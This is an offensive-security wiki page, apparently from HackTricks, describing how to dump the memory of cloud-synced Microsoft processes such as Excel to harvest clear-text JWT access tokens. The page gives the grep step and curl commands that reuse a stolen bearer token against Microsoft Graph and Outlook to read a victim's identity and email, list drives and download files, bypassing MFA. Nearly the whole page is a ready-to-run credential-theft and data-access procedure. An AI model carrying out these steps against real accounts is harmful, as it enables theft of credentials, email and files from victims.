# Az - Processes Memory Access Token

{{#include ../../../banners/hacktricks-training.md}}

## **Basic Information**

As explained in [**this video**](https://www.youtube.com/watch?v=OHKZkXC4Duw), some Microsoft software synchronized with the cloud (Excel, Teams...) might **store access tokens in clear-text in memory**. So just **dumping** the **memory** of the process and **grepping for JWT tokens** might grant you access over several resources of the victim in the cloud bypassing MFA.

Steps:

1. Dump the excel processes synchronized with in EntraID user with your favourite tool.
2. Run: `string excel.dmp | grep 'eyJ0'` and find several tokens in the output
3. Find the tokens that interest you the most and run tools over them:

```bash
# Check the identity of the token
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq

# Check the email (you need a token authorized in login.microsoftonline.com)
curl -s -H "Authorization: Bearer <token>" https://outlook.office.com/api/v2.0/me/messages | jq

# Download a file from Teams
## You need a token that can access graph.microsoft.com
## Then, find the <site_id> inside the memory and call
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/sites/<site_id>/drives | jq

## Then, list one drive
curl -s -H "Authorization: Bearer <token>" 'https://graph.microsoft.com/v1.0/sites/<site_id>/drives/<drive_id>' | jq

## Finally, download a file from that drive:
┌──(magichk㉿black-pearl)-[~]
└─$ curl -o <filename_output> -L -H "Authorization: Bearer <token>" '<@microsoft.graph.downloadUrl>'
```

**Note that these kind of access tokens can be also found inside other processes.**
